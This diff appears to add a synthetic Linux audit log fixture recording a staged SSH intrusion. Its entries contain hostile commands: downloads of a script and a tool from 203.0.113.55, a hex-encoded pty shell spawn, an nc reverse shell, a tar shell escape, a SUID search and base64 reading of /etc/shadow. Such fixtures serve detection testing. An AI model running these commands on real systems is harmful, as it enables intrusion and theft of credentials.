@@ -1,0 +1,31 @@
+type=USER_AUTH msg=audit(1790799001.111:1001): pid=2041 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="admin" exe="/usr/sbin/sshd" hostname=203.0.113.55 addr=203.0.113.55 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1790799007.222:1005): pid=2045 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.55 addr=203.0.113.55 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1790799020.000:1012): pid=2060 uid=0 auid=0 ses=42 msg='op=PAM:authentication grantors=pam_unix acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.55 addr=203.0.113.55 terminal=ssh res=success'
+type=SYSCALL msg=audit(1790799030.500:1050): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=0 uid=0 gid=0 euid=0 comm="wget" exe="/usr/bin/wget" key="exec_watch"
+type=EXECVE msg=audit(1790799030.500:1050): argc=4 a0="wget" a1="http://203.0.113.55/x.sh" a2="-O" a3="/tmp/x.sh"
+type=PATH msg=audit(1790799030.500:1050): item=0 name="/usr/bin/wget" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799032.500:1051): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=0 uid=0 gid=0 euid=0 comm="chmod" exe="/usr/bin/chmod" key="exec_watch"
+type=EXECVE msg=audit(1790799032.500:1051): argc=3 a0="chmod" a1="+x" a2="/tmp/x.sh"
+type=PATH msg=audit(1790799032.500:1051): item=0 name="/usr/bin/chmod" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799034.500:1052): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=0 uid=0 gid=0 euid=0 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1790799034.500:1052): argc=3 a0="bash" a1="-c" a2=2F746D702F782E73683B2069643B20756E616D65202D61
+type=PATH msg=audit(1790799034.500:1052): item=0 name="/bin/bash" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799040.500:1053): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=0 uid=0 gid=0 euid=0 comm="curl" exe="/usr/bin/curl" key="exec_watch"
+type=EXECVE msg=audit(1790799040.500:1053): argc=5 a0="curl" a1="-s" a2="http://203.0.113.55/tool" a3="-o" a4="/tmp/tool"
+type=PATH msg=audit(1790799040.500:1053): item=0 name="/usr/bin/curl" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799045.500:1054): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=1000 uid=0 gid=0 euid=0 comm="python" exe="/usr/bin/python" key="exec_watch"
+type=EXECVE msg=audit(1790799045.500:1054): argc=3 a0="python" a1="-c" a2=696D706F7274207074793B207074792E737061776E28222F62696E2F626173682229
+type=PATH msg=audit(1790799045.500:1054): item=0 name="/usr/bin/python" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799060.500:1055): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=1000 uid=0 gid=0 euid=0 comm="nc" exe="/usr/bin/nc" key="exec_watch"
+type=EXECVE msg=audit(1790799060.500:1055): argc=5 a0="nc" a1="-e" a2="/bin/sh" a3="203.0.113.55" a4="4444"
+type=PATH msg=audit(1790799060.500:1055): item=0 name="/usr/bin/nc" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SOCKADDR msg=audit(1790799060.500:1055): saddr=0200115CCB0071370000000000000000
+type=SYSCALL msg=audit(1790799075.500:1056): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=1000 uid=0 gid=0 euid=0 comm="tar" exe="/bin/tar" key="exec_watch"
+type=EXECVE msg=audit(1790799075.500:1056): argc=6 a0="tar" a1="cf" a2="/dev/null" a3="/dev/null" a4="--checkpoint=1" a5="--checkpoint-action=exec=/bin/sh"
+type=PATH msg=audit(1790799075.500:1056): item=0 name="/bin/tar" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799090.500:1057): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=1000 uid=0 gid=0 euid=0 comm="find" exe="/usr/bin/find" key="exec_watch"
+type=EXECVE msg=audit(1790799090.500:1057): argc=6 a0="find" a1="/" a2="-perm" a3="-4000" a4="-type" a5="f"
+type=PATH msg=audit(1790799090.500:1057): item=0 name="/usr/bin/find" inode=393221 mode=0100755 ouid=0 ogid=0
+type=SYSCALL msg=audit(1790799095.500:1058): arch=c000003e syscall=59 success=yes exit=0 ppid=2060 pid=2100 auid=1000 uid=0 gid=0 euid=0 comm="base64" exe="/usr/bin/base64" key="exec_watch"
+type=EXECVE msg=audit(1790799095.500:1058): argc=2 a0="base64" a1="/etc/shadow"
+type=PATH msg=audit(1790799095.500:1058): item=0 name="/usr/bin/base64" inode=393221 mode=0100755 ouid=0 ogid=0
